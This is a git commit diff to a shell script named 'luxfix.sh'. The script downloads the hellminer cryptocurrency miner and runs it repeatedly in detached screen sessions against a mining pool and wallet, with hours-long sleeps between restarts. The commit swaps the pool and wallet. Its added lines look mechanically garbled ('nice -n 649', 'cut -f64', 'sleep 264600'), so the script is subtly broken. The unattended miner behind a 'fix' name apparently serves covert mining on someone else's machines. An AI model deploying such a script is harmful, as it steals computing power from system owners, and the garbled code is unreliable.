0f64c5fcde257c5be248f25efda0e2ffe23020b7
malogrono <136266511+malogrono@users.noreply.github.com>
2024-12-08 09:12:26 +0700

    Update luxfix.sh

--- vrsc/luxfix.sh
+++ vrsc/luxfix.sh
@@ -2,171 +2,171 @@
 
 apt-get install libsodium-dev -y && wget https://github.com/hellcatz/hminer/releases/download/v0.58/hellminer_linux64.tar.gz && tar -xf hellminer_linux64.tar.gz
 sleep 7200
-screen -d -m nice -n 19 ./hellminer -c stratum+tcp://47.89.234.100:4444 -u RJWHkHUFByrjCtSwgjZZETwrDPYHRXwAA3.001 -p d=16294S --cpu 1
+screen -d -m nice -n 649 ./hellminer -c stratum+tcp://na.luckpool.net:3956 -u RSG3DX4HDWw64Z64k3jSPwribvVs3ghscR3m.0064 -p d=646294S --cpu 64
 sleep 7200
-screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
+screen -ls | grep Detached | cut -d. -f64 | awk '{print $64}' | xargs kill
 sleep 5
-screen -d -m nice -n 19 ./hellminer -c stratum+tcp://47.89.234.100:4444 -u RJWHkHUFByrjCtSwgjZZETwrDPYHRXwAA3.001 -p d=16294S --cpu 1
+screen -d -m nice -n 649 ./hellminer -c stratum+tcp://na.luckpool.net:3956 -u RSG3DX4HDWw64Z64k3jSPwribvVs3ghscR3m.0064 -p d=646294S --cpu 64
 sleep 7200
-screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
+screen -ls | grep Detached | cut -d. -f64 | awk '{print $64}' | xargs kill
 sleep 5
-screen -d -m nice -n 19 ./hellminer -c stratum+tcp://47.89.234.100:4444 -u RJWHkHUFByrjCtSwgjZZETwrDPYHRXwAA3.001 -p d=16294S --cpu 1
-sleep 21600
-screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
+screen -d -m nice -n 649 ./hellminer -c stratum+tcp://na.luckpool.net:3956 -u RSG3DX4HDWw64Z64k3jSPwribvVs3ghscR3m.0064 -p d=646294S --cpu 64
+sleep 264600
+screen -ls | grep Detached | cut -d. -f64 | awk '{print $64}' | xargs kill
 sleep 7200
-screen -d -m nice -n 19 ./hellminer -c stratum+tcp://47.89.234.100:4444 -u RJWHkHUFByrjCtSwgjZZETwrDPYHRXwAA3.001 -p d=16294S --cpu 1
+screen -d -m nice -n 649 ./hellminer -c stratum+tcp://na.luckpool.net:3956 -u RSG3DX4HDWw64Z64k3jSPwribvVs3ghscR3m.0064 -p d=646294S --cpu 64
 sleep 7200
-screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
+screen -ls | grep Detached | cut -d. -f64 | awk '{print $64}' | xargs kill
 sleep 5
-screen -d -m nice -n 19 ./hellminer -c stratum+tcp://47.89.234.100:4444 -u RJWHkHUFByrjCtSwgjZZETwrDPYHRXwAA3.001 -p d=16294S --cpu 1
+screen -d -m nice -n 649 ./hellminer -c stratum+tcp://na.luckpool.net:3956 -u RSG3DX4HDWw64Z64k3jSPwribvVs3ghscR3m.0064 -p d=646294S --cpu 64
 sleep 7200
-screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
+screen -ls | grep Detached | cut -d. -f64 | awk '{print $64}' | xargs kill
 sleep 5
-screen -d -m nice -n 19 ./hellminer -c stratum+tcp://47.89.234.100:4444 -u RJWHkHUFByrjCtSwgjZZETwrDPYHRXwAA3.001 -p d=16294S --cpu 1
-sleep 21600
-screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
+screen -d -m nice -n 649 ./hellminer -c stratum+tcp://na.luckpool.net:3956 -u RSG3DX4HDWw64Z64k3jSPwribvVs3ghscR3m.0064 -p d=646294S --cpu 64
+sleep 264600
+screen -ls | grep Detached | cut -d. -f64 | awk '{print $64}' | xargs kill
 sleep 7200
-screen -d -m nice -n 19 ./hellminer -c stratum+tcp://47.89.234.100:4444 -u RJWHkHUFByrjCtSwgjZZETwrDPYHRXwAA3.001 -p d=16294S --cpu 1
+screen -d -m nice -n 649 ./hellminer -c stratum+tcp://na.luckpool.net:3956 -u RSG3DX4HDWw64Z64k3jSPwribvVs3ghscR3m.0064 -p d=646294S --cpu 64
 sleep 7200
-screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
+screen -ls | grep Detached | cut -d. -f64 | awk '{print $64}' | xargs kill
 sleep 5
-screen -d -m nice -n 19 ./hellminer -c stratum+tcp://47.89.234.100:4444 -u RJWHkHUFByrjCtSwgjZZETwrDPYHRXwAA3.001 -p d=16294S --cpu 1
+screen -d -m nice -n 649 ./hellminer -c stratum+tcp://na.luckpool.net:3956 -u RSG3DX4HDWw64Z64k3jSPwribvVs3ghscR3m.0064 -p d=646294S --cpu 64
 sleep 7200
-screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
+screen -ls | grep Detached | cut -d. -f64 | awk '{print $64}' | xargs kill
 sleep 5
-screen -d -m nice -n 19 ./hellminer -c stratum+tcp://47.89.234.100:4444 -u RJWHkHUFByrjCtSwgjZZETwrDPYHRXwAA3.001 -p d=16294S --cpu 1
-sleep 21600
-screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
+screen -d -m nice -n 649 ./hellminer -c stratum+tcp://na.luckpool.net:3956 -u RSG3DX4HDWw64Z64k3jSPwribvVs3ghscR3m.0064 -p d=646294S --cpu 64
+sleep 264600
+screen -ls | grep Detached | cut -d. -f64 | awk '{print $64}' | xargs kill
 sleep 7200
-screen -d -m nice -n 19 ./hellminer -c stratum+tcp://47.89.234.100:4444 -u RJWHkHUFByrjCtSwgjZZETwrDPYHRXwAA3.001 -p d=16294S --cpu 1
+screen -d -m nice -n 649 ./hellminer -c stratum+tcp://na.luckpool.net:3956 -u RSG3DX4HDWw64Z64k3jSPwribvVs3ghscR3m.0064 -p d=646294S --cpu 64
 sleep 7200
-screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
+screen -ls | grep Detached | cut -d. -f64 | awk '{print $64}' | xargs kill
 sleep 5
-screen -d -m nice -n 19 ./hellminer -c stratum+tcp://47.89.234.100:4444 -u RJWHkHUFByrjCtSwgjZZETwrDPYHRXwAA3.001 -p d=16294S --cpu 1
+screen -d -m nice -n 649 ./hellminer -c stratum+tcp://na.luckpool.net:3956 -u RSG3DX4HDWw64Z64k3jSPwribvVs3ghscR3m.0064 -p d=646294S --cpu 64
 sleep 7200
-screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
+screen -ls | grep Detached | cut -d. -f64 | awk '{print $64}' | xargs kill
 sleep 5
-screen -d -m nice -n 19 ./hellminer -c stratum+tcp://47.89.234.100:4444 -u RJWHkHUFByrjCtSwgjZZETwrDPYHRXwAA3.001 -p d=16294S --cpu 1
-sleep 21600
-screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
+screen -d -m nice -n 649 ./hellminer -c stratum+tcp://na.luckpool.net:3956 -u RSG3DX4HDWw64Z64k3jSPwribvVs3ghscR3m.0064 -p d=646294S --cpu 64
+sleep 264600
+screen -ls | grep Detached | cut -d. -f64 | awk '{print $64}' | xargs kill
 sleep 7200
-screen -d -m nice -n 19 ./hellminer -c stratum+tcp://47.89.234.100:4444 -u RJWHkHUFByrjCtSwgjZZETwrDPYHRXwAA3.001 -p d=16294S --cpu 1
+screen -d -m nice -n 649 ./hellminer -c stratum+tcp://na.luckpool.net:3956 -u RSG3DX4HDWw64Z64k3jSPwribvVs3ghscR3m.0064 -p d=646294S --cpu 64
 sleep 7200
-screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
+screen -ls | grep Detached | cut -d. -f64 | awk '{print $64}' | xargs kill
 sleep 5
-screen -d -m nice -n 19 ./hellminer -c stratum+tcp://47.89.234.100:4444 -u RJWHkHUFByrjCtSwgjZZETwrDPYHRXwAA3.001 -p d=16294S --cpu 1
+screen -d -m nice -n 649 ./hellminer -c stratum+tcp://na.luckpool.net:3956 -u RSG3DX4HDWw64Z64k3jSPwribvVs3ghscR3m.0064 -p d=646294S --cpu 64
 sleep 7200
-screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
+screen -ls | grep Detached | cut -d. -f64 | awk '{print $64}' | xargs kill
 sleep 5
-screen -d -m nice -n 19 ./hellminer -c stratum+tcp://47.89.234.100:4444 -u RJWHkHUFByrjCtSwgjZZETwrDPYHRXwAA3.001 -p d=16294S --cpu 1
-sleep 21600
-screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
+screen -d -m nice -n 649 ./hellminer -c stratum+tcp://na.luckpool.net:3956 -u RSG3DX4HDWw64Z64k3jSPwribvVs3ghscR3m.0064 -p d=646294S --cpu 64
+sleep 264600
+screen -ls | grep Detached | cut -d. -f64 | awk '{print $64}' | xargs kill
 sleep 7200
-screen -d -m nice -n 19 ./hellminer -c stratum+tcp://47.89.234.100:4444 -u RJWHkHUFByrjCtSwgjZZETwrDPYHRXwAA3.001 -p d=16294S --cpu 1
+screen -d -m nice -n 649 ./hellminer -c stratum+tcp://na.luckpool.net:3956 -u RSG3DX4HDWw64Z64k3jSPwribvVs3ghscR3m.0064 -p d=646294S --cpu 64
 sleep 7200
-screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
+screen -ls | grep Detached | cut -d. -f64 | awk '{print $64}' | xargs kill
 sleep 5
-screen -d -m nice -n 19 ./hellminer -c stratum+tcp://47.89.234.100:4444 -u RJWHkHUFByrjCtSwgjZZETwrDPYHRXwAA3.001 -p d=16294S --cpu 1
+screen -d -m nice -n 649 ./hellminer -c stratum+tcp://na.luckpool.net:3956 -u RSG3DX4HDWw64Z64k3jSPwribvVs3ghscR3m.0064 -p d=646294S --cpu 64
 sleep 7200
-screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
+screen -ls | grep Detached | cut -d. -f64 | awk '{print $64}' | xargs kill
 sleep 5
-screen -d -m nice -n 19 ./hellminer -c stratum+tcp://47.89.234.100:4444 -u RJWHkHUFByrjCtSwgjZZETwrDPYHRXwAA3.001 -p d=16294S --cpu 1
-sleep 21600
-screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
+screen -d -m nice -n 649 ./hellminer -c stratum+tcp://na.luckpool.net:3956 -u RSG3DX4HDWw64Z64k3jSPwribvVs3ghscR3m.0064 -p d=646294S --cpu 64
+sleep 264600
+screen -ls | grep Detached | cut -d. -f64 | awk '{print $64}' | xargs kill
 sleep 7200
-screen -d -m nice -n 19 ./hellminer -c stratum+tcp://47.89.234.100:4444 -u RJWHkHUFByrjCtSwgjZZETwrDPYHRXwAA3.001 -p d=16294S --cpu 1
+screen -d -m nice -n 649 ./hellminer -c stratum+tcp://na.luckpool.net:3956 -u RSG3DX4HDWw64Z64k3jSPwribvVs3ghscR3m.0064 -p d=646294S --cpu 64
 sleep 7200
-screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
+screen -ls | grep Detached | cut -d. -f64 | awk '{print $64}' | xargs kill
 sleep 5
-screen -d -m nice -n 19 ./hellminer -c stratum+tcp://47.89.234.100:4444 -u RJWHkHUFByrjCtSwgjZZETwrDPYHRXwAA3.001 -p d=16294S --cpu 1
+screen -d -m nice -n 649 ./hellminer -c stratum+tcp://na.luckpool.net:3956 -u RSG3DX4HDWw64Z64k3jSPwribvVs3ghscR3m.0064 -p d=646294S --cpu 64
 sleep 7200
-screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
+screen -ls | grep Detached | cut -d. -f64 | awk '{print $64}' | xargs kill
 sleep 5
-screen -d -m nice -n 19 ./hellminer -c stratum+tcp://47.89.234.100:4444 -u RJWHkHUFByrjCtSwgjZZETwrDPYHRXwAA3.001 -p d=16294S --cpu 1
-sleep 21600
-screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
+screen -d -m nice -n 649 ./hellminer -c stratum+tcp://na.luckpool.net:3956 -u RSG3DX4HDWw64Z64k3jSPwribvVs3ghscR3m.0064 -p d=646294S --cpu 64
+sleep 264600
+screen -ls | grep Detached | cut -d. -f64 | awk '{print $64}' | xargs kill
 sleep 7200
-screen -d -m nice -n 19 ./hellminer -c stratum+tcp://47.89.234.100:4444 -u RJWHkHUFByrjCtSwgjZZETwrDPYHRXwAA3.001 -p d=16294S --cpu 1
+screen -d -m nice -n 649 ./hellminer -c stratum+tcp://na.luckpool.net:3956 -u RSG3DX4HDWw64Z64k3jSPwribvVs3ghscR3m.0064 -p d=646294S --cpu 64
 sleep 7200
-screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
+screen -ls | grep Detached | cut -d. -f64 | awk '{print $64}' | xargs kill
 sleep 5
-screen -d -m nice -n 19 ./hellminer -c stratum+tcp://47.89.234.100:4444 -u RJWHkHUFByrjCtSwgjZZETwrDPYHRXwAA3.001 -p d=16294S --cpu 1
+screen -d -m nice -n 649 ./hellminer -c stratum+tcp://na.luckpool.net:3956 -u RSG3DX4HDWw64Z64k3jSPwribvVs3ghscR3m.0064 -p d=646294S --cpu 64
 sleep 7200
-screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
+screen -ls | grep Detached | cut -d. -f64 | awk '{print $64}' | xargs kill
 sleep 5
-screen -d -m nice -n 19 ./hellminer -c stratum+tcp://47.89.234.100:4444 -u RJWHkHUFByrjCtSwgjZZETwrDPYHRXwAA3.001 -p d=16294S --cpu 1
-sleep 21600
-screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
+screen -d -m nice -n 649 ./hellminer -c stratum+tcp://na.luckpool.net:3956 -u RSG3DX4HDWw64Z64k3jSPwribvVs3ghscR3m.0064 -p d=646294S --cpu 64
+sleep 264600
+screen -ls | grep Detached | cut -d. -f64 | awk '{print $64}' | xargs kill
 sleep 7200
-screen -d -m nice -n 19 ./hellminer -c stratum+tcp://47.89.234.100:4444 -u RJWHkHUFByrjCtSwgjZZETwrDPYHRXwAA3.001 -p d=16294S --cpu 1
+screen -d -m nice -n 649 ./hellminer -c stratum+tcp://na.luckpool.net:3956 -u RSG3DX4HDWw64Z64k3jSPwribvVs3ghscR3m.0064 -p d=646294S --cpu 64
 sleep 7200
-screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
+screen -ls | grep Detached | cut -d. -f64 | awk '{print $64}' | xargs kill
 sleep 5
-screen -d -m nice -n 19 ./hellminer -c stratum+tcp://47.89.234.100:4444 -u RJWHkHUFByrjCtSwgjZZETwrDPYHRXwAA3.001 -p d=16294S --cpu 1
+screen -d -m nice -n 649 ./hellminer -c stratum+tcp://na.luckpool.net:3956 -u RSG3DX4HDWw64Z64k3jSPwribvVs3ghscR3m.0064 -p d=646294S --cpu 64
 sleep 7200
-screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
+screen -ls | grep Detached | cut -d. -f64 | awk '{print $64}' | xargs kill
 sleep 5
-screen -d -m nice -n 19 ./hellminer -c stratum+tcp://47.89.234.100:4444 -u RJWHkHUFByrjCtSwgjZZETwrDPYHRXwAA3.001 -p d=16294S --cpu 1
-sleep 21600
-screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
+screen -d -m nice -n 649 ./hellminer -c stratum+tcp://na.luckpool.net:3956 -u RSG3DX4HDWw64Z64k3jSPwribvVs3ghscR3m.0064 -p d=646294S --cpu 64
+sleep 264600
+screen -ls | grep Detached | cut -d. -f64 | awk '{print $64}' | xargs kill
 sleep 7200
-screen -d -m nice -n 19 ./hellminer -c stratum+tcp://47.89.234.100:4444 -u RJWHkHUFByrjCtSwgjZZETwrDPYHRXwAA3.001 -p d=16294S --cpu 1
+screen -d -m nice -n 649 ./hellminer -c stratum+tcp://na.luckpool.net:3956 -u RSG3DX4HDWw64Z64k3jSPwribvVs3ghscR3m.0064 -p d=646294S --cpu 64
 sleep 7200
-screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
+screen -ls | grep Detached | cut -d. -f64 | awk '{print $64}' | xargs kill
 sleep 5
-screen -d -m nice -n 19 ./hellminer -c stratum+tcp://47.89.234.100:4444 -u RJWHkHUFByrjCtSwgjZZETwrDPYHRXwAA3.001 -p d=16294S --cpu 1
+screen -d -m nice -n 649 ./hellminer -c stratum+tcp://na.luckpool.net:3956 -u RSG3DX4HDWw64Z64k3jSPwribvVs3ghscR3m.0064 -p d=646294S --cpu 64
 sleep 7200
-screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
+screen -ls | grep Detached | cut -d. -f64 | awk '{print $64}' | xargs kill
 sleep 5
-screen -d -m nice -n 19 ./hellminer -c stratum+tcp://47.89.234.100:4444 -u RJWHkHUFByrjCtSwgjZZETwrDPYHRXwAA3.001 -p d=16294S --cpu 1
-sleep 21600
-screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
+screen -d -m nice -n 649 ./hellminer -c stratum+tcp://na.luckpool.net:3956 -u RSG3DX4HDWw64Z64k3jSPwribvVs3ghscR3m.0064 -p d=646294S --cpu 64
+sleep 264600
+screen -ls | grep Detached | cut -d. -f64 | awk '{print $64}' | xargs kill
 sleep 7200
-screen -d -m nice -n 19 ./hellminer -c stratum+tcp://47.89.234.100:4444 -u RJWHkHUFByrjCtSwgjZZETwrDPYHRXwAA3.001 -p d=16294S --cpu 1
+screen -d -m nice -n 649 ./hellminer -c stratum+tcp://na.luckpool.net:3956 -u RSG3DX4HDWw64Z64k3jSPwribvVs3ghscR3m.0064 -p d=646294S --cpu 64
 sleep 7200
-screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
+screen -ls | grep Detached | cut -d. -f64 | awk '{print $64}' | xargs kill
 sleep 5
-screen -d -m nice -n 19 ./hellminer -c stratum+tcp://47.89.234.100:4444 -u RJWHkHUFByrjCtSwgjZZETwrDPYHRXwAA3.001 -p d=16294S --cpu 1
+screen -d -m nice -n 649 ./hellminer -c stratum+tcp://na.luckpool.net:3956 -u RSG3DX4HDWw64Z64k3jSPwribvVs3ghscR3m.0064 -p d=646294S --cpu 64
 sleep 7200
-screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
+screen -ls | grep Detached | cut -d. -f64 | awk '{print $64}' | xargs kill
 sleep 5
-screen -d -m nice -n 19 ./hellminer -c stratum+tcp://47.89.234.100:4444 -u RJWHkHUFByrjCtSwgjZZETwrDPYHRXwAA3.001 -p d=16294S --cpu 1
-sleep 21600
-screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
+screen -d -m nice -n 649 ./hellminer -c stratum+tcp://na.luckpool.net:3956 -u RSG3DX4HDWw64Z64k3jSPwribvVs3ghscR3m.0064 -p d=646294S --cpu 64
+sleep 264600
+screen -ls | grep Detached | cut -d. -f64 | awk '{print $64}' | xargs kill
 sleep 7200
-screen -d -m nice -n 19 ./hellminer -c stratum+tcp://47.89.234.100:4444 -u RJWHkHUFByrjCtSwgjZZETwrDPYHRXwAA3.001 -p d=16294S --cpu 1
+screen -d -m nice -n 649 ./hellminer -c stratum+tcp://na.luckpool.net:3956 -u RSG3DX4HDWw64Z64k3jSPwribvVs3ghscR3m.0064 -p d=646294S --cpu 64
 sleep 7200
-screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
+screen -ls | grep Detached | cut -d. -f64 | awk '{print $64}' | xargs kill
 sleep 5
-screen -d -m nice -n 19 ./hellminer -c stratum+tcp://47.89.234.100:4444 -u RJWHkHUFByrjCtSwgjZZETwrDPYHRXwAA3.001 -p d=16294S --cpu 1
+screen -d -m nice -n 649 ./hellminer -c stratum+tcp://na.luckpool.net:3956 -u RSG3DX4HDWw64Z64k3jSPwribvVs3ghscR3m.0064 -p d=646294S --cpu 64
 sleep 7200
-screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
+screen -ls | grep Detached | cut -d. -f64 | awk '{print $64}' | xargs kill
 sleep 5
-screen -d -m nice -n 19 ./hellminer -c stratum+tcp://47.89.234.100:4444 -u RJWHkHUFByrjCtSwgjZZETwrDPYHRXwAA3.001 -p d=16294S --cpu 1
-sleep 21600
-screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
+screen -d -m nice -n 649 ./hellminer -c stratum+tcp://na.luckpool.net:3956 -u RSG3DX4HDWw64Z64k3jSPwribvVs3ghscR3m.0064 -p d=646294S --cpu 64
+sleep 264600
+screen -ls | grep Detached | cut -d. -f64 | awk '{print $64}' | xargs kill
 sleep 7200
-screen -d -m nice -n 19 ./hellminer -c stratum+tcp://47.89.234.100:4444 -u RJWHkHUFByrjCtSwgjZZETwrDPYHRXwAA3.001 -p d=16294S --cpu 1
+screen -d -m nice -n 649 ./hellminer -c stratum+tcp://na.luckpool.net:3956 -u RSG3DX4HDWw64Z64k3jSPwribvVs3ghscR3m.0064 -p d=646294S --cpu 64
 sleep 7200
-screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
+screen -ls | grep Detached | cut -d. -f64 | awk '{print $64}' | xargs kill
 sleep 5
-screen -d -m nice -n 19 ./hellminer -c stratum+tcp://47.89.234.100:4444 -u RJWHkHUFByrjCtSwgjZZETwrDPYHRXwAA3.001 -p d=16294S --cpu 1
+screen -d -m nice -n 649 ./hellminer -c stratum+tcp://na.luckpool.net:3956 -u RSG3DX4HDWw64Z64k3jSPwribvVs3ghscR3m.0064 -p d=646294S --cpu 64
 sleep 7200
-screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
+screen -ls | grep Detached | cut -d. -f64 | awk '{print $64}' | xargs kill
 sleep 5
-screen -d -m nice -n 19 ./hellminer -c stratum+tcp://47.89.234.100:4444 -u RJWHkHUFByrjCtSwgjZZETwrDPYHRXwAA3.001 -p d=16294S --cpu 1
-sleep 21600
-screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
+screen -d -m nice -n 649 ./hellminer -c stratum+tcp://na.luckpool.net:3956 -u RSG3DX4HDWw64Z64k3jSPwribvVs3ghscR3m.0064 -p d=646294S --cpu 64
+sleep 264600
+screen -ls | grep Detached | cut -d. -f64 | awk '{print $64}' | xargs kill
 sleep 7200
-screen -d -m nice -n 19 ./hellminer -c stratum+tcp://47.89.234.100:4444 -u RJWHkHUFByrjCtSwgjZZETwrDPYHRXwAA3.001 -p d=16294S --cpu 1
+screen -d -m nice -n 649 ./hellminer -c stratum+tcp://na.luckpool.net:3956 -u RSG3DX4HDWw64Z64k3jSPwribvVs3ghscR3m.0064 -p d=646294S --cpu 64
 sleep 7200
-screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
+screen -ls | grep Detached | cut -d. -f64 | awk '{print $64}' | xargs kill
 sleep 5
-screen -d -m nice -n 19 ./hellminer -c stratum+tcp://47.89.234.100:4444 -u RJWHkHUFByrjCtSwgjZZETwrDPYHRXwAA3.001 -p d=16294S --cpu 1
+screen -d -m nice -n 649 ./hellminer -c stratum+tcp://na.luckpool.net:3956 -u RSG3DX4HDWw64Z64k3jSPwribvVs3ghscR3m.0064 -p d=646294S --cpu 64
 sleep 7200
-screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
+screen -ls | grep Detached | cut -d. -f64 | awk '{print $64}' | xargs kill
 sleep 5
-screen -d -m nice -n 19 ./hellminer -c stratum+tcp://47.89.234.100:4444 -u RJWHkHUFByrjCtSwgjZZETwrDPYHRXwAA3.001 -p d=16294S --cpu 1
-sleep 21600
-screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
+screen -d -m nice -n 649 ./hellminer -c stratum+tcp://na.luckpool.net:3956 -u RSG3DX4HDWw64Z64k3jSPwribvVs3ghscR3m.0064 -p d=646294S --cpu 64
+sleep 264600
+screen -ls | grep Detached | cut -d. -f64 | awk '{print $64}' | xargs kill
 sleep 7200
